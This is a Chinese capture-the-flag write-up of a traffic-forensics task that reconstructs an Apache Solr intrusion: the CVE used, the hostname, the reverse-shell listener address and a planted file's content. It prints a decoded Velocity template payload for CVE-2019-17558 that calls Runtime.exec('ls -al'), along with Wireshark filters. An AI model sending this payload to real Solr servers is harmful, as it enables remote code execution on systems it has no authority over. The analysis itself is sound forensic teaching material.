# 我去，黑客

## 题目简述

题目要求从网络流量中还原一次 Apache Solr 入侵的四项信息：攻击者利用的 CVE、受害主机名、反弹 Shell 的接收端 `IP:PORT`，以及 `/tmp/success.txt` 的内容。

## 解题过程

### 识别 Solr 命令执行漏洞

先筛选发往 Solr 的 HTTP 请求，并重点检查 URI 中同时包含 `wt=velocity`、`v.template=custom` 的记录：

```text
http.request.uri contains "wt=velocity"
```

关键请求访问 `/solr/demo/select`，通过自定义 Velocity 模板反射取得 `java.lang.Runtime`，再调用 `exec('ls -al')`。URL 解码后的核心结构如下：

```text
/solr/demo/select?q=1&wt=velocity&v.template=custom&
v.template.custom=#set($x='')
  #set($rt=$x.class.forName('java.lang.Runtime'))
  #set($ex=$rt.getRuntime().exec('ls -al'))
  ...读取并输出进程标准输出...
```

这种利用链对应 Apache Solr VelocityResponseWriter 的远程代码执行漏洞 `CVE-2019-17558`。判断依据不是单纯搜索 payload，而是请求明确启用了用户可控模板，并在模板中调用 `Runtime.exec`。

### 关联命令执行与反弹 Shell

对命令执行请求使用“追踪 HTTP/TCP 流”，沿同一会话检查攻击者执行的后续命令及其响应。`hostname` 命令的返回值为：

```text
b1574d1963ff
```

建立反弹 Shell 的命令中出现接收端地址：

```text
192.168.207.1:2333
```

随后可用该地址缩小流量范围：

```text
ip.addr == 192.168.207.1 && tcp.port == 2333
```

进入对应 TCP 流后，按字节顺序重组交互内容；其中读取 `/tmp/success.txt` 的响应为：

```text
HACKEDLOL
```

最终四个字段依次为：

| 字段 | 值 |
| --- | --- |
| CVE | `CVE-2019-17558` |
| hostname | `b1574d1963ff` |
| 反弹 Shell 接收端 | `192.168.207.1:2333` |
| `/tmp/success.txt` | `HACKEDLOL` |

按题面规定的顺序和分隔符拼接这四项即可提交。需要说明的是，仓库没有保留原始流量附件，官方总 Markdown 与 PDF 中的五张证据图也均已失链，因此现有仓库只能核验上述文字记录，无法可靠确认最终截图中的 flag 外壳与分隔符；这里不臆造一个无法由现有材料验证的完整字符串。

## 方法总结

这类流量取证题应先用应用层特征定位初始漏洞请求，再围绕同一 TCP 流恢复命令和响应，最后用反弹连接的 `IP:PORT` 关联另一条会话。识别 CVE、主机信息和文件内容都应落到具体的请求字段或流量字节上；若原始附件或截图缺失，则必须明确证据边界，不能把推测写成已验证结果。
